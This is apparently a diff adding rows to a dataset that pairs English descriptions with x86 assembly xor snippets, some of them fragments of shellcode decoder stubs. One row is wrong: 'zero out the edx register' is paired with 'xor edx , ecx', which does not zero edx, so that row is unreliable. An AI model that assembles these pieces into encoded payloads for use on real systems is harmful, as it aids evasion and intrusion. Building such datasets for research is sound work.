+perform the xor operation between the al register and the value 0x4a,perform xor operation al register and value var0,"xor al , 0x4a","xor al , var0"
+perform a xor operation between ax and 0x539 and save the result in ax,perform xor operation ax and var0 and save result ax,"xor ax , 0x539","xor ax , var0"
+perform a logical xor between the bx register and the ax register and save the result in ax,perform logical xor var0 register and ax register and save result ax,"xor ax , bx","xor ax , var0"
+jump to the call_decoded label if the result of the logical xor between the ax register and the bx register is zero,jump var0 label if result logical xor ax register and var1 register zero,"xor ax , bx \n jz call_decoded","xor ax , var1 \n jz var0"
+jump to the encoded label if the result of the logical xor between the bl register and the value 0xBB is zero,jump encoded label if result logical xor var0 register and value var1 zero,"xor bl , 0xBB \n jz encoded","xor var0 , var1 \n jz encoded"
+jump to the formatting label if the result of the logical xor between the bl register and the value 0xBB is zero,jump formatting label if result logical xor var0 register and value var1 zero,"xor bl , 0xBB \n jz formatting","xor var0 , var1 \n jz formatting"
+initialize bx to 0,initialize var0 0,"xor bx , bx","xor var0 , var0"
+clear the bx register,clear var0 register,"xor bx , bx","xor var0 , var0"
+perform the xor operation between the byte starting at the addess in esi and the value 0x2c,perform xor operation byte starting addess var0 and value var1,"xor byte [esi] , 0x2c","xor byte [var0] , var1"
+perform a xor operation between a byte in esi and cl,perform xor operation byte var0 and cl,"xor byte [esi] , cl","xor byte [var0] , cl"
+perform the xor operation between the byte at memory location esi+ecx and 0x0f,perform xor operation byte memory location var0 and var1,"xor byte [esi+ecx] , 0x0f","xor byte [var0] , var1"
+perform the xor operation between cl and 0x32 and store the resut in cl,perform xor operation cl and var0 and store var1 cl,"xor cl , 0x32","xor cl , var0"
+jump to the Next_Cycle label if the result of the logical xor between the cl register and the value 0xAA is not zero,jump var0 label if result logical xor cl register and value var1 not zero,"xor cl , 0xAA \n jnz Next_Cycle","xor cl , var1 \n jnz var0"
+jump to the shift_decode label if the result of the logical xor between the cl register and the value 0xAA is zero,jump var0 label if result logical xor cl register and value var1 zero,"xor cl , 0XAA \n jz shift_decode","xor cl , 0XAA \n jz var0"
+jump to the Next_Cycle label if the result of the logical xor between the dl register and the value 0xBB is zero,jump var0 label if result logical xor dl register and value var1 zero,"xor dl , 0xBB \n jz Next_Cycle","xor dl , var1 \n jz var0"
+clear the eax register,clear var0 register,"xor eax , eax","xor var0 , var0"
+clear the eax register and move the next byte of the shellcode into the lower byte of the register,clear var0 register and move next byte shellcode lower byte register,"xor eax , eax \n mov al , [esi+1]","xor var0 , var0 \n mov al , [esi+1]"
+clear the eax register and move 2 in the lowest byte of the register,clear var0 register and move 2 lowest byte register,"xor eax , eax \n mov al , 2","xor var0 , var0 \n mov al , 2"
+clear the eax register and push its contents onto the stack,clear var0 register and push its contents stack,"xor eax , eax \n push eax","xor var0 , var0 \n push var0"
+clear eax and ebx,clear var0 and var1,"xor eax , eax \n xor ebx , ebx","xor var0 , var0 \n xor var1 , var1"
+"zero out eax, ebx and ecx",zero out var0 var1 and var2,"xor eax , eax \n xor ebx , ebx \n xor ecx , ecx","xor var0 , var0 \n xor var1 , var1 \n xor var2 , var2"
+clear ebp register,clear var0 register,"xor ebp , ebp","xor var0 , var0"
+clear ebx,clear var0,"xor ebx , ebx","xor var0 , var0"
+clear ebx register,clear var0 register,"xor ebx , ebx","xor var0 , var0"
+zero out the ebx register and jump to the exit label if the contents of the eax register is not equal to the contents of the ebx register,zero out var0 register and jump exit label if contents var2 register not equal contents var0 register,"xor ebx , ebx \n cmp eax , ebx \n jne exit","xor var0 , var0 \n cmp var2 , var0 \n jne exit"
+clear ebx and move 0x4 in the lowest byte of the register,clear var0 and move var1 lowest byte register,"xor ebx , ebx \n mov bl , 0x4","xor var0 , var0 \n mov bl , var1"
+zero out the ebx register and push zero onto the stack,zero out var0 register and push zero stack,"xor ebx , ebx \n push ebx","xor var0 , var0 \n push var0"
+clean ebx and ecx,clean var0 and var1,"xor ebx , ebx \n xor ecx , ecx","xor var0 , var0 \n xor var1 , var1"
+perform a logical xor between the ecx register and the bh register and save the result in ecx,perform logical xor var0 register and bh register and save result var0,"xor ecx , bh","xor var0 , bh"
+clear ecx,clear var0,"xor ecx , ecx","xor var0 , var0"
+zero out the ecx register and jump to the l1 label if the contents of the ebx register is not equal to the contents of the ecx register,zero out var0 register and jump var2 label if contents var3 register not equal contents var0 register,"xor ecx , ecx \n cmp ebx , ecx \n jne l1","xor var0 , var0 \n cmp var3 , var0 \n jne var2"
+zero out the ecx register and move the next byte of the shellcode into the lower byte of the register,zero out var0 register and move next byte shellcode lower byte register,"xor ecx , ecx \n mov cl , [esi+1]","xor var0 , var0 \n mov cl , [esi+1]"
+zero out ecx and move 0x3 in the lowest byte of the register,zero out var0 and move var1 lowest byte register,"xor ecx , ecx \n mov cl , 0x3","xor var0 , var0 \n mov cl , var1"
+clear the ecx register and move 2 in the lowest byte of the register,clear var0 register and move 2 lowest byte register,"xor ecx , ecx \n mov cl , 2","xor var0 , var0 \n mov cl , 2"
+clean the ecx register and move 5 in the lowest byte of the register,clean var0 register and move 5 lowest byte register,"xor ecx , ecx \n mov cl , 5","xor var0 , var0 \n mov cl , 5"
+zero out the eax register and the ecx register,zero out var0 register and var1 register,"xor ecx , ecx \n mul ecx","xor var1 , var1 \n mul var1"
+init edi 0,var0 var1 0,"xor edi , edi","xor var1 , var1"
+zero out the edx register and move the next byte of the shellcode into the lower byte of the register,zero out var0 register and move next byte shellcode lower byte register,"xor edx , ecx \n mov dl , [esi+1]","xor var0 , ecx \n mov dl , [esi+1]"
+zero out the edx register and jump to the l2 label if the contents of the ecx register is not equal to the contents of the edx register,zero out var0 register and jump var2 label if contents var3 register not equal contents var0 register,"xor edx , edx \n cmp ecx , edx \n jne l2","xor var0 , var0 \n cmp var3 , var0 \n jne var2"
+clean the edx register and move 5 in the lowest byte of the register,clean var0 register and move 5 lowest byte register,"xor edx , edx \n mov dl , 5","xor var0 , var0 \n mov dl , 5"
+zero out zero_reg,zero out var0,"xor zero_reg , zero_reg","xor var0 , var0"
